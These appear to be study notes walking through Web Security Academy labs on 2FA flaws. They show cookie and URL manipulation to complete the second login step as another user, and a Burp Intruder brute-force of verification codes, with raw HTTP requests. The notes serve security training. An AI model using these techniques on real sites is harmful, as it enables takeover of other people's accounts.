# Flawed two-factor verification logic

After a user has completed the initial login step, the website doesn't adequately verify that the same user is completing the second step.

***EX 1***:

the user logs in with their normal credentials in the first step as follows:

```pure
POST /login-steps/first HTTP/1.1
Host: vulnerable-website.com
...
username=carlos&password=qwerty
```

They are then assigned a cookie that relates to their account, before being taken to the second step of the login process:

```pure
HTTP/1.1 200 OK
Set-Cookie: account=carlos
GET /login-steps/second HTTP/1.1
Cookie: account=carlos
```

When submitting the verification code, the request uses this cookie to determine which account the user is trying to access:

```pure
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=carlos
...
verification-code=123456
```

In this case, you could log in using their own credentials but then change the value of the account cookie to any arbitrary username when submitting the verification code.

```pure
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=victim-user
...
verification-code=123456
```

***EX 2***:

1. Log in to your own account.
   
       https://example.com/login

2. Your 2FA verification code will be sent to you by email.
   
       https://example.com/login2

3. Click the Email client button to access your emails.

4. Go to your account page and make a note of the URL.
   
       https://example.com/my-account?id=wiener

5. Log out of your account.

6. Log in using the victim's credentials.

7. When prompted for the verification code, manually change the URL to navigate to `/my-account?id=carlos`.

# Brute-forcing 2FA verification codes

As with passwords, websites need to take steps to prevent brute-forcing of the 2FA verification code.

This is especially important because the code is often a simple 4 or 6-digit number. Without adequate brute-force protection, cracking such a code is trivial. 

***EX***:

1. With Burp running, log in to your own account and investigate the 2FA verification process. Notice that in the `POST /login2` request, the `verify` parameter is used to determine which user's account is being accessed.

```bash
GET /login2 HTTP/2
Host: 0a720006042bd68e81b4704700120068.web-security-academy.net
Cookie: session=usAT6uLTaoSwiWxa4ykgAHDNR56oGzRR; verify=carlos
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://0a720006042bd68e81b4704700120068.web-security-academy.net/login
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: document
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: same-origin
Sec-Fetch-User: ?1
Te: trailers
```

2. Log out of your account. 

3. Send the `GET /login2` request in `step 1` to Burp Repeater. Change the value of the `verify` parameter to `carlos` and send the request. This ensures that a temporary 2FA code is generated for Carlos. 

4. Go to the login page and enter your username and password. Then, submit an invalid 2FA code. 

5. Send the `POST /login2` request to Burp Intruder. 

6. In Burp Intruder, set the `verify` parameter to `carlos` and add a payload position to the `mfa-code` parameter. Brute-force the verification code. 
   
   ```bash
   POST /login2 HTTP/2
   Host: 0a720006042bd68e81b4704700120068.web-security-academy.net
   Cookie: session=jnKfc72StiuCsxkFHqUG0ftfUbOuhP8Y; verify=carlos
   User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
   Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
   Accept-Language: en-US,en;q=0.5
   Accept-Encoding: gzip, deflate
   Content-Type: application/x-www-form-urlencoded
   Content-Length: 13
   Origin: https://0a720006042bd68e81b4704700120068.web-security-academy.net
   Referer: https://0a720006042bd68e81b4704700120068.web-security-academy.net/login2
   Upgrade-Insecure-Requests: 1
   Sec-Fetch-Dest: document
   Sec-Fetch-Mode: navigate
   Sec-Fetch-Site: same-origin
   Sec-Fetch-User: ?1
   Te: trailers
   
   mfa-code=§0756§
   ```

7. Load the `302` response in the browser or length. 

# 2FA bypass using a brute-force attack

if you enter the wrong code twice, you will be logged out again. You need to use Burp's session handling features to log back in automatically before sending each request. 

[Lab: 2FA bypass using a brute-force attack | Web Security Academy](https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-bypass-using-a-brute-force-attack)
